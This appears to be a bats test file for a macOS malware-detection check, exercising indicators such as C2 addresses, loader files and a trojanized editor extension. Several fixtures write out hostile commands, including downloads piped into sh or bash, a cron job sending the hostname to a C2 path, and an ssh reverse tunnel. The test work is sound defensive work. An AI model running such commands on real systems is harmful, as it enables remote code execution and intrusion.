load helpers

setup() {
  setup_env
  T="$BATS_TEST_TMPDIR/T"; mkdir -p "$T" "$FORTKEEP_SYSROOT/tmp"
  stub getconf 'exit 1'
  stub crontab 'exit 1'
  # ps: launchd, plus $PROC ("PID TTY ETIME PROGRAM"), $ARGS ("PID COMMAND") and $PARENTS ("PID PPID") when a test sets them.
  stub ps 'case "$*" in
  *etime*) echo "    1 ??  10-00:00:00 /sbin/launchd"; [ -z "${PROC:-}" ] || echo "$PROC" ;;
  *command*) echo "    1 /sbin/launchd"; [ -z "${ARGS:-}" ] || echo "$ARGS" ;;
  *ppid*) echo "    1     0"; [ -z "${PARENTS:-}" ] || echo "$PARENTS" ;;
esac'
  # lsof: $CWD for the working-folder query, $CONN for the connection list.
  stub lsof 'case "$*" in *cwd*) printf "%s\n" "${CWD:-}" ;; *ESTABLISHED*) printf "%s\n" "${CONN:-}" ;; esac'
}
# Never the real Mac: HOME, the system root and every temp folder are this test's, and ps, lsof and crontab are fakes.
chk() { run env TMPDIR="$T" PATH="$BATS_TEST_TMPDIR/bin:/usr/bin:/bin:/usr/sbin:/sbin" /bin/bash "$REPO/checks/macos/GD-RT-03.sh"; }

@test "GD-RT-03 a clean Mac → PASS with no note" {
  chk; [ "$(field status)" = PASS ]; [ "$(field evidence)" = "No live malware process, C2 connection or known backdoor file" ]
  [ -z "$(field note)" ]
}
@test "GD-RT-03 a process list it can't read → ERROR, not PASS" {
  stub ps 'exit 1'
  chk; [ "$(field status)" = ERROR ]; [ "$(field evidence)" = "Could not list the running processes" ]
}
@test "GD-RT-03 node -i with no terminal → FAIL naming the process; with a terminal it's yours" {
  PROC='  4242 ??  00:05 /usr/local/bin/node' ARGS='  4242 node -i' chk
  [ "$(field status)" = FAIL ]; [[ "$(field note)" == "node (pid 4242) runs interactively with no terminal"* ]]
  PROC='  4242 ttys001  00:05 /usr/local/bin/node' ARGS='  4242 node -i' chk; [ "$(field status)" = PASS ]
}
@test "GD-RT-03 inline code with no terminal for a minute → FAIL; a brief run is only noted; the command is never quoted" {
  PROC='  77 ??  01:30 /opt/homebrew/bin/node' ARGS='  77 node -e tok-SECRET-1' chk
  [ "$(field status)" = FAIL ]; [[ "$(field note)" == "node (pid 77) runs inline code"* ]]; [[ "$output" != *tok-SECRET-1* ]]
  PROC='  77 ??  00:05 /opt/homebrew/bin/node' ARGS='  77 node -e tok-SECRET-1' chk
  [ "$(field status)" = PASS ]; [ "$(field note)" = "node (pid 77) runs inline code" ]
}
@test "GD-RT-03 Python's multiprocessing workers and resource tracker with no terminal aren't loaders; extra code after them is" {
  PROC="$(printf '  61 ??  12:00 /usr/bin/python3\n  62 ??  12:00 /usr/bin/python3')"
  ARGS="$(printf '  61 python3 -c from multiprocessing.spawn import spawn_main; spawn_main(tracker_fd=5, pipe_handle=7) --multiprocessing-fork\n  62 python3 -c from multiprocessing.resource_tracker import main;main(4)')"
  PROC="$PROC" ARGS="$ARGS" chk; [ "$(field status)" = PASS ]; [ -z "$(field note)" ]
  PROC="$PROC" ARGS='  62 python3 -c from multiprocessing.resource_tracker import main;main(4); exec(x)' chk
  [ "$(field status)" = FAIL ]; [[ "$(field note)" == "python3 (pid 62) runs inline code"* ]]
}
@test "GD-RT-03 node run from a temp folder, or python working in one with no terminal → FAIL" {
  PROC="  88 ??  00:02 $T/x/node" ARGS='  88 node a.js' chk
  [ "$(field status)" = FAIL ]; [[ "$(field note)" == "node (pid 88) runs from a temp folder"* ]]
  PROC='  99 ??  05:00 /usr/bin/python3' ARGS='  99 python3 serve.py' CWD="$(printf 'p99\nfcwd\nn%s/work' "$T")" chk
  [ "$(field status)" = FAIL ]; [[ "$(field note)" == "python3 (pid 99) works in a temp folder"* ]]
}
@test "GD-RT-03 an established connection to a C2 address → FAIL naming it; any other address doesn't count" {
  CONN="$(printf 'p500\ncnode\nn192.168.1.5:57465->23.27.13.43:443')" chk
  [ "$(field status)" = FAIL ]; [[ "$(field note)" == "a connection to 23.27.13.43, a known PolinRider C2 server"* ]]
  CONN="$(printf 'p500\ncnode\nn192.168.1.5:57465->123.27.13.43:443')" chk; [ "$(field status)" = PASS ]
}
@test "GD-RT-03 the trojanized extension's files and SSH key → FAIL; a private ~/.ssh isn't read" {
  for f in Library/LaunchAgents/com.apple.sysmond.plist .config/.smt .config/.smtk; do
    mkdir -p "$HOME/${f%/*}"; touch "$HOME/$f"
    chk; [ "$(field status)" = FAIL ]; [[ "$(field note)" == "~/$f exists"* ]]; rm "$HOME/$f"
  done
  mkdir -p "$HOME/.ssh"; echo 'ssh-ed25519 AAAAC3Nza me@laptop' > "$HOME/.ssh/authorized_keys"
  chk; [ "$(field status)" = PASS ]
  echo 'ssh-ed25519 AAAAC3Nzb svc-telemetry' >> "$HOME/.ssh/authorized_keys"
  chk; [ "$(field status)" = FAIL ]; [[ "$(field note)" == "~/.ssh/authorized_keys lets in a key labelled svc-telemetry"* ]]
  echo "$HOME/.ssh" > "$FORTKEEP_PRIVATE_PATHS"
  chk; [ "$(field status)" = PASS ]; [ "$(field note)" = "(a private folder was excluded)" ]
}
@test "GD-RT-03 the loader's home folders → FAIL; a ~/.node_modules without its packages is only noted" {
  mkdir "$HOME/.n2"; chk; [ "$(field status)" = FAIL ]; [[ "$(field note)" == "~/.n2 exists"* ]]; rmdir "$HOME/.n2"
  mkdir "$HOME/.node_modules"; echo '{"dependencies": {"left-pad": "1"}}' > "$HOME/.node_modules/package.json"
  chk; [ "$(field status)" = PASS ]; [ "$(field note)" = "~/.node_modules exists without the BeaverTail packages" ]
  echo '{"dependencies": {"axios": "1", "socket.io-client": "4"}}' > "$HOME/.node_modules/package.json"
  chk; [ "$(field status)" = FAIL ]; [[ "$(field note)" == "~/.node_modules holds the BeaverTail loader's packages"* ]]
}
@test "GD-RT-03 the PolinRider loader's .npm-ws files in ~/.node_modules → FAIL; a look-alike name is only noted" {
  mkdir "$HOME/.node_modules"; : > "$HOME/.node_modules/.npm-wsx.json"
  chk; [ "$(field status)" = PASS ]; [ "$(field note)" = "~/.node_modules exists without the BeaverTail packages" ]
  : > "$HOME/.node_modules/.npm-ws.pid"; : > "$HOME/.node_modules/.npm-ws.log"
  chk; [ "$(field status)" = FAIL ]; [[ "$(field note)" == "~/.node_modules holds the PolinRider loader's files: .npm-ws.pid .npm-ws.log"* ]]
}
@test "GD-RT-03 loader staging in a temp folder → FAIL: an npm stage, staged pip packages, a dotfile named after you" {
  mkdir -p "$FORTKEEP_SYSROOT/tmp/.npm/x\$y_123456_654321"
  chk; [ "$(field status)" = FAIL ]; [[ "$(field note)" == *"/tmp/.npm/x\$y_123456_654321 is a loader staging folder"* ]]
  rm -rf "$FORTKEEP_SYSROOT/tmp/.npm"; mkdir -p "$T/.pip/lib/pyzipper"
  chk; [ "$(field status)" = FAIL ]; [[ "$(field note)" == *"/.pip holds the loader's staged Python packages"* ]]
  rm -rf "$T/.pip"; mkdir "$T/.pip"
  chk; [ "$(field status)" = PASS ]; [[ "$(field note)" == *"/.pip exists" ]]
  rm -rf "$T/.pip"; : > "$T/.$(printf '%s' "$(id -un)" | base64 | tr -d '=' | tr '/+' '_-')"
  chk; [ "$(field status)" = FAIL ]; [[ "$(field note)" == *"is named after you in base64"* ]]
}
@test "GD-RT-03 a start-up file that fetches or runs inline code → FAIL by file and line, never quoting it; comments don't count" {
  # The header is assembled here so the file carries nothing a leak scanner reads as a credential.
  printf '# curl https://x.example/i | sh\nexport A=1\ncurl -s -H "%s: tok-SECRET-2" https://x.example/i | sh\n' "Author""ization" > "$HOME/.zshrc"
  chk; [ "$(field status)" = FAIL ]; [ "$(field evidence)" = "1 sign(s) of live malware on this Mac" ]
  [[ "$(field note)" == "~/.zshrc line 3 runs downloaded or decoded code at start-up"* ]]; [[ "$output" != *tok-SECRET-2* ]]
  printf 'eval "$(curl -fsSL https://x.example/env)"\n' > "$HOME/.zprofile"; printf 'x() { echo aGk= | base64 -D | bash; }\n' > "$HOME/.bashrc"
  chk; [ "$(field status)" = FAIL ]; [ "$(field evidence)" = "3 sign(s) of live malware on this Mac" ]
  [[ "$(field note)" == *"~/.zprofile line 1 runs downloaded"* ]]; [[ "$(field note)" == *"~/.bashrc line 1 runs downloaded"* ]]
}
@test "GD-RT-03 start-up aliases and functions that decode or run a one-liner are only noted, never a FAIL" {
  { echo "alias urldecode='python3 -c \"import sys, urllib.parse as u; print(u.unquote(sys.argv[1]))\"'"
    echo 'kubesecret() { kubectl get secret "$1" -o jsonpath="{.data.$2}" | base64 -d; }'
    echo "alias nodever='node -e \"console.log(process.version)\"'"; } > "$HOME/.zshrc"
  chk; [ "$(field status)" = PASS ]
  [ "$(field note)" = "~/.zshrc line 1 decodes or runs inline code at start-up; ~/.zshrc line 2 decodes or runs inline code at start-up; ~/.zshrc line 3 decodes or runs inline code at start-up" ]
  { echo "alias myip='curl -s https://ipinfo.example | python3 -m json.tool'"
    echo "gh() { curl -s https://api.example/x | python3 -c 'import json,sys; print(json.load(sys.stdin))'; }"; } > "$HOME/.zshrc"
  chk; [ "$(field status)" = PASS ]
  { echo 'curl -fsSL https://x.example/a | python3'; echo 'curl -fsSL https://x.example/b | node -'; } > "$HOME/.zshrc"
  chk; [ "$(field status)" = FAIL ]; [ "$(field evidence)" = "2 sign(s) of live malware on this Mac" ]
}
@test "GD-RT-03 a cron job or LaunchAgent that runs inline code → FAIL; an ordinary one doesn't count" {
  stub crontab 'echo "*/5 * * * * /usr/bin/python3 -c \"import os\""'
  chk; [ "$(field status)" = FAIL ]; [[ "$(field note)" == "your crontab line 1 runs inline code"* ]]
  stub crontab 'exit 1'; A="$HOME/Library/LaunchAgents"; mkdir -p "$A"
  agent() { printf '<?xml version="1.0" encoding="UTF-8"?>\n<plist version="1.0"><dict><key>Label</key><string>%s</string><key>ProgramArguments</key><array>%s</array></dict></plist>\n' "$1" "$2" > "$A/$1.plist"; }
  agent ok '<string>/usr/bin/true</string>'; chk; [ "$(field status)" = PASS ]
  agent bad '<string>/usr/local/bin/node</string><string>-e</string><string>x</string>'
  chk; [ "$(field status)" = FAIL ]; [[ "$(field note)" == "~/Library/LaunchAgents/bad.plist runs inline code"* ]]
}
@test "GD-RT-03 a private LaunchAgents folder is never opened or named" {
  A="$HOME/Library/LaunchAgents"; mkdir -p "$A"
  printf '<?xml version="1.0" encoding="UTF-8"?>\n<plist version="1.0"><dict><key>Label</key><string>bad</string><key>ProgramArguments</key><array><string>/usr/local/bin/node</string><string>-e</string><string>x</string></array></dict></plist>\n' > "$A/bad.plist"
  echo "$A" > "$FORTKEEP_PRIVATE_PATHS"
  stub plutil 'echo "$@" >> "$BATS_TEST_TMPDIR/access.log"; exec /usr/bin/plutil "$@"'
  chk; [ "$(field status)" = PASS ]; [ "$(field note)" = "(a private folder was excluded)" ]; [[ "$output" != *bad.plist* ]]
  run grep -F LaunchAgents/ "$BATS_TEST_TMPDIR/access.log"; [ "$status" -ne 0 ]
}
@test "GD-RT-03 python fed its code through stdin, detached under launchd for a minute → FAIL; with a parent of its own it's a tool" {
  PROC='  4343 ??  05:00 /usr/bin/python3' ARGS='  4343 python3 -u -' PARENTS='  4343     1' chk
  [ "$(field status)" = FAIL ]; [[ "$(field note)" == "python3 (pid 4343) runs code fed through stdin"* ]]
  PROC='  4343 ??  05:00 /usr/bin/python3' ARGS='  4343 python3 -u -' PARENTS='  4343   900' chk; [ "$(field status)" = PASS ]
  PROC='  4343 ??  00:20 /usr/bin/python3' ARGS='  4343 python3 -u -' PARENTS='  4343     1' chk; [ "$(field status)" = PASS ]
}
@test "GD-RT-03 ssh forwarding any remote port to this Mac's SSH → FAIL; an ordinary autossh tunnel doesn't count" {
  PROC='  555 ??  10:00 /usr/bin/ssh' ARGS='  555 ssh -N -R *:0:localhost:22 -o ExitOnForwardFailure=yes tunnel@203.0.113.9' chk
  [ "$(field status)" = FAIL ]; [[ "$(field note)" == "ssh (pid 555) opens a reverse tunnel into this Mac's SSH"* ]]
  PROC='  556 ??  10:00 /opt/homebrew/bin/autossh' ARGS='  556 autossh -M 0 -N -R 8022:localhost:22 me@203.0.113.9' chk
  [ "$(field status)" = PASS ]
}
@test "GD-RT-03 a connection to the newer C2 addresses → FAIL naming the family; a neighbouring address doesn't count" {
  for c in "103.179.142.155 a known PolinRider C2 server" "193.32.204.199 GhostAction's C2 server" "85.137.53.71 the Miasma worm's C2 server"; do
    CONN="$(printf 'p500\ncnode\nn192.168.1.5:57465->%s:443' "${c%% *}")" chk
    [ "$(field status)" = FAIL ]; [[ "$(field note)" == "a connection to ${c%% *}, ${c#* }"* ]]
  done
  CONN="$(printf 'p500\ncnode\nn192.168.1.5:57465->193.32.204.19:443')" chk; [ "$(field status)" = PASS ]
}
@test "GD-RT-03 ChainDrop's, Miasma's, MacSync's and AMOS's files → FAIL by family; a near name doesn't count" {
  for f in "ChainDrop Library/LaunchAgents/com.user.gh-token-monitor.plist" "ChainDrop .local/bin/gh-token-monitor.sh" \
    "ChainDrop .config/gh-token-monitor/" "Miasma Library/Application Support/NodeJS/sync.js" "Miasma .config/.miasma/" \
    "Miasma Library/Application Support/com.apple.spotlight/index-v2.cache" "MacSync Library/Logs/.sysnotif-agent.log"; do
    p="$HOME/${f#* }"; mkdir -p "${p%/*}"; [ "${p%/}" != "$p" ] || touch "$p"; p="${p%/}"
    chk; [ "$(field status)" = FAIL ]; [[ "$(field note)" == "~/${p#"$HOME"/} exists (a known ${f%% *} file)"* ]]; rm -rf "$p"
  done
  mkdir -p "$HOME/Library/Logs" "$HOME/Library/Application Support/com.apple.spotlight"
  touch "$HOME/Library/Logs/sysnotif-agent.log" "$HOME/Library/Application Support/com.apple.spotlight/index.cache"
  chk; [ "$(field status)" = PASS ]; [ -z "$(field note)" ]
  mkdir -p "$FORTKEEP_SYSROOT/Library/LaunchDaemons"; : > "$FORTKEEP_SYSROOT/Library/LaunchDaemons/com.finder.helper.plist"
  chk; [ "$(field status)" = FAIL ]; [[ "$(field note)" == *"/Library/LaunchDaemons/com.finder.helper.plist exists (a known AMOS file)"* ]]
}
@test "GD-RT-03 a ~/.agent that keeps running .helper for the console user → FAIL; generic names alone are only noted" {
  printf '#!/bin/bash\necho "console user: $(stat -f %%Su /dev/console)"\n' > "$HOME/.agent"; mkdir -p "$HOME/Library/Application Support/System"; : > "$HOME/.mainhelper"
  chk; [ "$(field status)" = PASS ]
  [ "$(field note)" = "~/Library/Application Support/System exists: macOS makes no such folder, MacSync does; ~/.mainhelper exists, a file name the AMOS backdoor uses" ]
  printf 'while true; do\n  u=$(stat -f "%%Su" /dev/console)\n  sudo -u "$u" "$HOME/.helper"\n  sleep 1\ndone\n' > "$HOME/.agent"
  chk; [ "$(field status)" = FAIL ]; [[ "$(field note)" == "~/.agent keeps running .helper as whoever is logged in"* ]]
}
@test "GD-RT-03 the trojanized Claude Code extension's 2.1.312 or 2.1.313 folder in Cursor → FAIL; other versions don't count" {
  E="$HOME/.cursor/extensions"; mkdir -p "$E/anthropic.claude-code-2.1.314-darwin-arm64" "$E/anthropic.claude-code-2.1.3120"
  chk; [ "$(field status)" = PASS ]
  mkdir "$E/Anthropic.claude-code-2.1.313-darwin-arm64"
  chk; [ "$(field status)" = FAIL ]; [[ "$(field note)" == "~/.cursor/extensions/Anthropic.claude-code-2.1.313-darwin-arm64 is the trojanized Claude Code extension"* ]]
}
@test "GD-RT-03 the extension's .stk_ file and MacSync's .sys- payload in a temp folder → FAIL; other lengths don't count" {
  : > "$T/.stk_0a1b2c3d4"; : > "$T/.sys-12345678"
  chk; [ "$(field status)" = PASS ]
  : > "$T/.stk_0a1b2c3d4e"
  chk; [ "$(field status)" = FAIL ]; [[ "$(field note)" == *"/.stk_0a1b2c3d4e is the trojanized Claude Code extension's file"* ]]
  rm "$T/.stk_0a1b2c3d4e"; : > "$FORTKEEP_SYSROOT/tmp/.sys-1234567890123456"
  chk; [ "$(field status)" = FAIL ]; [[ "$(field note)" == *"/tmp/.sys-1234567890123456 is where MacSync's dropper puts its payload"* ]]
}
@test "GD-RT-03 Miasma's profile block or MacSync's .repair-run line in a start-up file → FAIL by line; a near text doesn't count" {
  # The marker is assembled here: no file in this repo holds a whole one.
  printf 'export A=1\n%s\nexport B=2\n' "### Node Auto-""Update ###" > "$HOME/.zshrc"; chk; [ "$(field status)" = PASS ]
  printf 'export A=1\n%s\n' "### Node Auto-""Update Script ###" > "$HOME/.zshrc"
  chk; [ "$(field status)" = FAIL ]; [[ "$(field note)" == "~/.zshrc line 2 starts the Miasma worm's auto-update block"* ]]
  printf '%s\n' '"$HOME/Library/Application Support/System/.repair-run" >/dev/null 2>&1 &' > "$HOME/.zshrc"
  chk; [ "$(field status)" = FAIL ]; [[ "$(field note)" == "~/.zshrc line 1 runs MacSync's .repair-run script"* ]]
}
@test "GD-RT-03 a global git pre-commit or post-checkout hook running .repair-run → FAIL; another hook, or an ordinary one, doesn't count" {
  printf '[core]\n\thooksPath = ~/.githooks\n' > "$HOME/.gitconfig"; mkdir -p "$HOME/.githooks"
  printf '#!/bin/sh\ngitleaks protect --staged\n' > "$HOME/.githooks/pre-commit"
  printf '#!/bin/sh\n"$HOME/.cache/.repair-run" &\n' > "$HOME/.githooks/post-merge"
  chk; [ "$(field status)" = PASS ]
  printf '#!/bin/sh\n"$HOME/.cache/.repair-run" &\n' > "$HOME/.githooks/post-checkout"
  chk; [ "$(field status)" = FAIL ]; [[ "$(field note)" == "~/.githooks/post-checkout runs MacSync's .repair-run script"* ]]
}
@test "GD-RT-03 a cron line that pipes a download into a shell, GhostAction's included → FAIL by line; a plain download doesn't count" {
  stub crontab "cat <<'EOS'
0 3 * * * curl -s https://x.example/ping > /dev/null
EOS"
  chk; [ "$(field status)" = PASS ]
  m="#gh""c2"  # GhostAction's marker, assembled here
  stub crontab "cat <<'EOS'
# keep
*/5 * * * * curl -s -m 10 http://203.0.113.9:8080/c2/\$(hostname) | bash  $m
EOS"
  chk; [ "$(field status)" = FAIL ]; [ "$(field evidence)" = "1 sign(s) of live malware on this Mac" ]
  [[ "$(field note)" == "your crontab line 2 runs downloaded code"* ]]
  stub crontab "echo '*/5 * * * * /usr/local/bin/sync-x  $m'"
  chk; [ "$(field status)" = FAIL ]; [[ "$(field note)" == "your crontab line 1 runs downloaded code"* ]]
}
@test "GD-RT-03 MacSync's com.apple.finder.agent label → FAIL; other Apple labels in your own LaunchAgents are counted in a note, never named" {
  A="$HOME/Library/LaunchAgents"; mkdir -p "$A"
  agent() { printf '<?xml version="1.0" encoding="UTF-8"?>\n<plist version="1.0"><dict><key>Label</key><string>%s</string><key>ProgramArguments</key><array><string>/usr/bin/true</string></array></dict></plist>\n' "$2" > "$A/$1.plist"; }
  agent mine com.example.finder.agent; agent cert com.apple.CSConfigDotMacCert-someone@me.example-SharedServices.Agent
  chk; [ "$(field status)" = PASS ]; [ -z "$(field note)" ]
  agent odd com.apple.updater; chk; [ "$(field status)" = PASS ]
  [ "$(field note)" = "1 agent(s) in your own LaunchAgents use an Apple label, as malware does to blend in: worth a look" ]
  agent finder com.apple.finder.agent
  chk; [ "$(field status)" = FAIL ]; [[ "$(field note)" == "~/Library/LaunchAgents/finder.plist is MacSync's LaunchAgent"* ]]
}
@test "GD-RT-03 an editor or app start-up file carrying PolinRider's patch → FAIL; ordinary code doesn't; a private folder isn't read" {
  M="$FORTKEEP_SYSROOT/Applications/Cursor.app/Contents/Resources/app/out"; mkdir -p "$M"
  printf 'console.log(1);\t\t\teval(x); // M2606\n' > "$M/main.js"; chk; [ "$(field status)" = PASS ]
  printf 'var hex = "00%s11";\n' "C25061""7A" > "$M/main.js"; chk; [ "$(field status)" = PASS ]  # the tag's letters as data
  { printf 'console.log(1);'; printf '\t%.0s' $(seq 60); printf 'eval(x);\n'; } > "$M/main.js"
  chk; [ "$(field status)" = FAIL ]; [[ "$(field note)" == *"/Applications/Cursor.app/Contents/Resources/app/out/main.js is patched by PolinRider's second stage"* ]]
  printf 'console.log(1);eval(atob("eA=="));\n' > "$M/main.js"; chk; [ "$(field status)" = FAIL ]
  rm "$M/main.js"; D="$HOME/Library/Application Support/discord"; mkdir -p "$D/0.0.300/modules/discord_desktop_core"
  printf "module.exports = require('./core.asar');\n/*%s*/\n" "M26063""0A" > "$D/0.0.300/modules/discord_desktop_core/index.js"
  chk; [ "$(field status)" = FAIL ]; [[ "$(field note)" == "~/Library/Application Support/discord/0.0.300/modules/discord_desktop_core/index.js is patched"* ]]
  echo "$D" > "$FORTKEEP_PRIVATE_PATHS"
  chk; [ "$(field status)" = PASS ]; [ "$(field note)" = "(a private folder was excluded)" ]
}
@test "GD-RT-03 an editor start-up file it can't read is noted, never taken as clean" {
  M="$FORTKEEP_SYSROOT/Applications/Visual Studio Code.app/Contents/Resources/app/out"; mkdir -p "$M"
  echo 'console.log(1);' > "$M/main.js"; chmod 000 "$M/main.js"
  chk; [ "$(field status)" = PASS ]; [[ "$(field note)" == *"/Visual Studio Code.app/Contents/Resources/app/out/main.js couldn't be read" ]]
}
